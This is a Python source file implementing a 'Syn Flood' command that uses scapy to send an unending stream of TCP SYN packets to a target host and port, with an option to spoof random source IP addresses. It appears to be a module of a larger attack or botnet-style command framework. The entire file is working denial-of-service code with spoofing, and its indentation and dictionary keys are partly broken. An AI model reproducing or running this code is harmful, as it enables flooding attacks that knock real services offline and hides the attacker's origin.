import random
import sys
from threading import Thread
from command import Command#, D_PORT_KEY, D_PORT_KEY, RAND_SRC_KEY

# Suppress scapy import warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import TCP, IP, send, RandShort

D_HOST_KEY = ["dhost"]
D_PORT_KEY = ["dport"]
RAND_SRC_KEY = ["src"]

class SynFlood(Command):
    
    display_name = "Syn Flood"
    
    class SynFloodThread(Thread):

		def __init__(self, d_host, d_port, rand_src):
			Thread.__init__(self)
			self.d_host = d_host
			self.d_port = d_port
			self.rand_src = rand_src
			self.stopped = False
	
		def run(self):
	
			while not self.stopped:
				ip_segment = IP()
				ip_segment.dst = self.d_host
	
				if self.rand_src:
					# randomize class A IP
					ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
				# else - scapy will automatically assign the local IP as src.
	
				tcp_segment = TCP(flags="S")
				tcp_segment.sport = RandShort()
				tcp_segment.dport = int(self.d_port)
	
	        	send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet

    def execute(self, params):
    
        self.d_host = params[D_HOST_KEY]
        self.d_port = params[D_PORT_KEY]
        self.rand_src = params.get(RAND_SRC_KEY) or False
    
    	syn_flood_thread = self.SynFloodThread(self.d_host, self.d_port, self.rand_src)
    	syn_flood_thread.run()
    	# add this thread to the thread pool with 'syn_flood_key'
    	return syn_flood_thread